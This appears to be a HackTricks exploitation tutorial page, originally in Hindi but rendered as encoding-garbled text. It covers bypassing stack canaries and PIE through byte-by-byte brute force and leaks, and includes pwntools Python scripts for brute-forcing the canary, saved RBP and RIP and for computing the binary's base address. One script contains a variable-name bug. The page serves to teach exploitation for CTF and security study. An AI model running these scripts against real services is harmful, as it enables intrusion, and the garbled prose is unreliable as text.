<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**рдФрд░ HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>


**рдпрджрд┐ рдЖрдк рдПрдХ рдмрд╛рдЗрдирд░реА рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдХреИрдирд░реА рдФрд░ PIE (Position Independent Executable) рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдЦреЛрдЬрдирд╛ рд╣реЛрдЧрд╛ред**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддрд╛ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рдпрджрд┐ рдпрд╣ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХреА рдЧрдИ рд╣реИ рдФрд░ рдпрд╣ рдлрдВрдХреНрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЗрд╕реЗ рдиреЛрдЯрд┐рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рди рдХреЛ рдлрдВрдХреНрд╢рди рдХреЙрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрд╣ рдорд╛рди рдирд┐рдХрд╛рд╕ рд╕реЗ рдкрд╣рд▓реЗ рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред
{% endhint %}

# рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдирд╛

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╣реИ рдЬреЛ **рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЪрд╛рдЗрд▓реНрдб рдкреНрд░реЛрд╕реЗрд╕реЗрд╕ рдХреЛ рдлреЛрд░реНрдХ рдХрд░рддрд╛ рд╣реИ** (рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛), рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рд╕реЗ рдЬреБрдбрд╝рддреЗ рд╣реИрдВ **рд╡рд╣реА рдХреИрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рддрдм, рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рдмрд╕ **рдЗрд╕реЗ рдЪрд░ рджрд░ рдЪрд░ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реИ**, рдФрд░ рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЕрдиреБрдорд╛рдирд┐рдд рдХреИрдирд░реА рдмрд╛рдЗрдЯ рд╕рд╣реА рдереА рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рдЬрд╛рдВрдЪрдХрд░ рдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреНрд░реИрд╢ рд╣реБрдЖ рд╣реИ рдпрд╛ рдЗрд╕рдХрд╛ рдирд┐рдпрдорд┐рдд рдкреНрд░рд╡рд╛рд╣ рдЬрд╛рд░реА рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдлрдВрдХреНрд╢рди **8 рдмрд╛рдЗрдЯреНрд╕ рдХреИрдирд░реА (x64) рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рддрд╛ рд╣реИ** рдФрд░ рд╕рд╣реА рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рдФрд░ рдПрдХ рдЦрд░рд╛рдм рдмрд╛рдЗрдЯ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рддрд╛ рд╣реИ рдмрд╕ **рдЬрд╛рдВрдЪ** рдХрд░рдХреЗ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рд╡рд╛рдкрд╕ рднреЗрдЬреА рдЧрдИ рд╣реИ (рджреВрд╕рд░реЗ рддрд░реАрдХреЗ рдореЗрдВ **рдЕрдиреНрдп рд╕реНрдерд┐рддрд┐** рдореЗрдВ **try/except** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ):

## рдЙрджрд╛рд╣рд░рдг 1

рдпрд╣ рдЙрджрд╛рд╣рд░рдг 64 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ 32 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЖрд╕рд╛рдиреА рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## рдЙрджрд╛рд╣рд░рдг 2

рдпрд╣ 32 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдкрд░рдВрддреБ рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ 64рдмрд┐рдЯреНрд╕ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдкреНрд░реЛрдЧреНрд░рд╛рдо рдкрд╣рд▓реЗ рдПрдХ рдмрд╛рдЗрдЯ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрдирдкреБрдЯ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ** рдФрд░ рдлрд┐рд░ рдкреЗрд▓реЛрдбред
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# рдкреНрд░рд┐рдВрдЯ рдХреИрдирд░реА

рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ рдЙрд╕реЗ **рдкреНрд░рд┐рдВрдЯ рдХрд░рдирд╛**ред\
рдХрд▓реНрдкрдирд╛ рдХреАрдЬрд┐рдП рдХрд┐ рдПрдХ **рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЬреЛ рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ** рд╡рд╣ рдПрдХ **puts** рдлрдВрдХреНрд╢рди рдХреЛ **рд╕реНрдЯреИрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рд╣рд┐рд╕реНрд╕реЗ рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдХреЗ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдЬрд╛рдирддрд╛ рд╣реИ рдХрд┐ рдХреИрдирд░реА рдХрд╛ **рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдПрдХ рдирд▓ рдмрд╛рдЗрдЯ рд╣реИ** (`\x00`) рдФрд░ рдХреИрдирд░реА рдХреЗ рдмрд╛рдХреА рдмрд╛рдЗрдЯреНрд╕ **рд░реИрдВрдбрдо** рд╣реЛрддреЗ рд╣реИрдВред рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **рдХреИрдирд░реА рдХреЗ рдкрд╣рд▓реЗ рдмрд╛рдЗрдЯ рддрдХ рд╕реНрдЯреИрдХ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рджреЗрддрд╛ рд╣реИ**ред\
рдлрд┐рд░, рд╣рдорд▓рд╛рд╡рд░ **puts рдлрдВрдХреНрд╢рдирд▓рд┐рдЯреА рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ** рдкреЗрд▓реЛрдб рдХреЗ рдордзреНрдп рдореЗрдВ рдЬреЛ **рд╕рд╛рд░реЗ рдХреИрдирд░реА рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░ рджреЗрдЧрд╛** (рдкрд╣рд▓реЗ рдирд▓ рдмрд╛рдЗрдЯ рдХреЛ рдЫреЛрдбрд╝рдХрд░)ред\
рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛рд╡рд░ **рдирдпрд╛ рд╣рдорд▓рд╛ рддреИрдпрд╛рд░ рдХрд░рдХреЗ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ рдХреИрдирд░реА рдХрд╛ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ (рдЙрд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рддреНрд░ рдореЗрдВ)

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ, рдпрд╣ рддрдХрдиреАрдХ рдмрд╣реБрдд **рд╕реАрдорд┐рдд** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП **рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреА рд╕рд╛рдордЧреНрд░реА** рдХреЛ **рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП **рдХреИрдирд░реА** рдФрд░ рдлрд┐рд░ рдПрдХ рдирдпрд╛ рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (рдЙрд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рддреНрд░ рдореЗрдВ) рдФрд░ **рдЕрд╕рд▓реА рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рднреЗрдЬрдиреЗ** рдХреЗ рд▓рд┐рдПред\
CTF рдЙрджрд╛рд╣рд░рдг: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIE рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдХреБрдЫ рдкрддрд╛ рд▓реАрдХ рдХрд░рдирд╛** рд╣реЛрдЧрд╛ред рдФрд░ рдЕрдЧрд░ рдмрд╛рдЗрдирд░реА рдХреЛрдИ рдкрддреЗ рд▓реАрдХ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ рддреЛ рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ **RBP рдФрд░ RIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдП рдЧрдП рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛** рдЬреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрдВрдХреНрд╢рди рдореЗрдВ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдПрдХ рдмрд╛рдЗрдирд░реА **рдХреИрдирд░реА** рдФрд░ **PIE** рджреЛрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ рдЖрдк рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯреНрд╕ (x64) рд╕реЗрд╡ рдХрд┐рдП рдЧрдП **RBP** рд╣реЛрдВрдЧреЗ рдФрд░ **рдЕрдЧрд▓реЗ** 8 рдмрд╛рдЗрдЯреНрд╕ рд╕реЗрд╡ рдХрд┐рдП рдЧрдП **RIP рд╣реЛрдВрдЧреЗред**

рдмрд╛рдЗрдирд░реА рд╕реЗ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рдиреНрдп рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рд╕рд╣реА рд╣реИ рдЕрдЧрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдмрд╕ рдХреНрд░реИрд╢ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП **рд╡рд╣реА рдлрдВрдХреНрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ RBP рдФрд░ RIP рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

PIE рдХреЛ рдкрд░рд╛рдЬрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЦрд┐рд░реА рдЪреАрдЬ рдЬреЛ рдЖрдкрдХреЛ рдХрд░рдиреА рд╣реИ рд╡рд╣ рд╣реИ **рд▓реАрдХ рдХрд┐рдП рдЧрдП** рдкрддреЛрдВ рд╕реЗ **рдЙрдкрдпреЛрдЧреА рдкрддреЗ рдХреА рдЧрдгрдирд╛ рдХрд░рдирд╛**: **RBP** рдФрд░ **RIP**.

**RBP** рд╕реЗ рдЖрдк рдпрд╣ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдЖрдк рдЕрдкрдиреЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдХрд╣рд╛рдБ рд▓рд┐рдЦ рд░рд╣реЗ рд╣реИрдВ**. рдпрд╣ рдЬрд╛рдирдирд╛ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рд╕реНрдЯреИрдХ рдХреЗ рдЕрдВрджрд░ _"/bin/sh\x00"_ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдХрд╣рд╛рдБ рд▓рд┐рдЦрдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВред **RBP рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдПрдХ рдмреНрд░реЗрдХрдкреЙрдЗрдВрдЯ рд▓рдЧрд╛рдХрд░** рдФрд░ рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдХрд┐ **рдЖрдкрдХрд╛ рд╢реЗрд▓рдХреЛрдб рдХрд╣рд╛рдБ рд╕реНрдерд┐рдд рд╣реИ**, рдЖрдк рд╢реЗрд▓рдХреЛрдб рдФрд░ RBP рдХреЗ рдмреАрдЪ рдХреА рджреВрд░реА рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** рд╕реЗ рдЖрдк **PIE рдмрд╛рдЗрдирд░реА рдХрд╛ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕** рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **рд╡реИрдз ROP рдЪреЗрди** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ред
рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╕ `objdump -d vunbinary` рдХрд░реЗрдВ рдФрд░ рдбрд┐рд╕рдЕрд╕реЗрдВрдмрд▓ рдХрд┐рдП рдЧрдП рдЕрдВрддрд┐рдо рдкрддреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

![](<../../.gitbook/assets/image (145).png>)

рдЙрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд╕рднреА рдХреЛрдб рдХреЛ рд▓реЛрдХреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ **1 рдмрд╛рдЗрдЯ рдФрд░ рдЖрдзрд╛ рд╣реА рдЖрд╡рд╢реНрдпрдХ рд╣реИ**, рддрдм, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ **рд▓реАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ RIP рд╣реЛрдЧрд╛ рд▓реЗрдХрд┐рди "000" рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдиреЗ _0x562002970**ecf**_ рдХреЛ рд▓реАрдХ рдХрд┐рдпрд╛ рд╣реИ рддреЛ рдмреЗрд╕ рдПрдбреНрд░реЗрд╕ _0x562002970**000**_ рд╣реЛрдЧрд╛ред
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
